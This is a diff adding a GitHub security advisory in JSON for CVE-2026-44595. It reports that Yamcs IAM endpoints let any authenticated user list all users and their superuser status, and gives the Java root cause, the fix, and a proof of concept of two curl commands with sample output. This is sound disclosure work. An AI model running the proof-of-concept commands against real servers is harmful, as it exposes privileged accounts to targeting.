@@ -1,0 +1,57 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-p2rj-mrmc-9w29",
+  "modified": "2026-05-27T00:03:56Z",
+  "published": "2026-05-27T00:03:56Z",
+  "aliases": [
+    "CVE-2026-44595"
+  ],
+  "summary": "Yamcs vulnerable to unauthorized user enumeration via IAM API endpoints",
+  "details": "### Summary\n\nThe IAM API endpoints (`listUsers`, `getUser`, `listGroups`, and `getGroup`) in `yamcs-core` do not enforce the required `SystemPrivilege.ControlAccess` check. As a result, **any authenticated user** (even those with low or no privileges) can enumerate all user accounts in the system, including their usernames, superuser status, and group memberships.\n\nThis constitutes a broken access control vulnerability (CWE-862) that leaks sensitive user information.\n\n### Root Cause\n\n**File:** `yamcs-core/src/main/java/org/yamcs/http/api/IamApi.java:125,180,357,372`\n\n`listUsers()`, `getUser()`, `listGroups()`, and `getGroup()` do not require `SystemPrivilege.ControlAccess`. Any authenticated user — regardless of privileges — can enumerate all users, their superuser status, and group memberships:\n\n```java\n// listUsers — NO checkSystemPrivilege\npublic void listUsers(Context ctx, Empty request, ...) {\n    var sensitiveDetails = ctx.user.hasSystemPrivilege(SystemPrivilege.ControlAccess);\n    // sensitiveDetails=false for low-priv users, but name/superuser/active still exposed\n    for (User user : users) {\n        UserInfo userb = toUserInfo(user, sensitiveDetails, directory);\n        responseb.addUsers(userb);\n    }\n}\n```\n\nCompare with properly protected endpoints:\n\n```java\n// createUser — correctly protected\npublic void createUser(Context ctx, ...) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess); // present\n```\n\n### Impact\n\nAny authenticated user can:\n\n1. List all user accounts in the system\n2. Identify which accounts have superuser privileges\n3. Use this information to target privileged accounts\n\n### Proof of Concept\n\n```bash\n# Authenticate as any low-privilege user GET access_token\ncurl -s -X POST \"http://localhost:8090/auth/token\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"grant_type=password&username=lowpriv&password=lowpriv123\"\n\n# Enumerate all users — no ControlAccess required\ncurl -s \"http://TARGET:8090/api/users\" \\\n  -H \"Authorization: Bearer $TOKEN\" #paste access_token\n```\n\n**Output (confirmed):**\n\n```json\n{\n  \"users\": [\n    { \"name\": \"admin\", \"superuser\": true, \"active\": true },\n    { \"name\": \"operator\", \"superuser\": true, \"active\": true },\n    { \"name\": \"lowpriv\", \"superuser\": false, \"active\": true }\n  ]\n}\n```\n\n### Fix\n\nAdd `ControlAccess` check to `listUsers`, `getUser`, `listGroups`, `getGroup`:\n\n```java\npublic void listUsers(Context ctx, Empty request, ...) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess); // ADD THIS\n    ...\n}\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.yamcs:yamcs-core"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.12.7"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/yamcs/yamcs/security/advisories/GHSA-p2rj-mrmc-9w29"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/yamcs/yamcs"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-05-27T00:03:56Z",
+    "nvd_published_at": null
+  }
+}
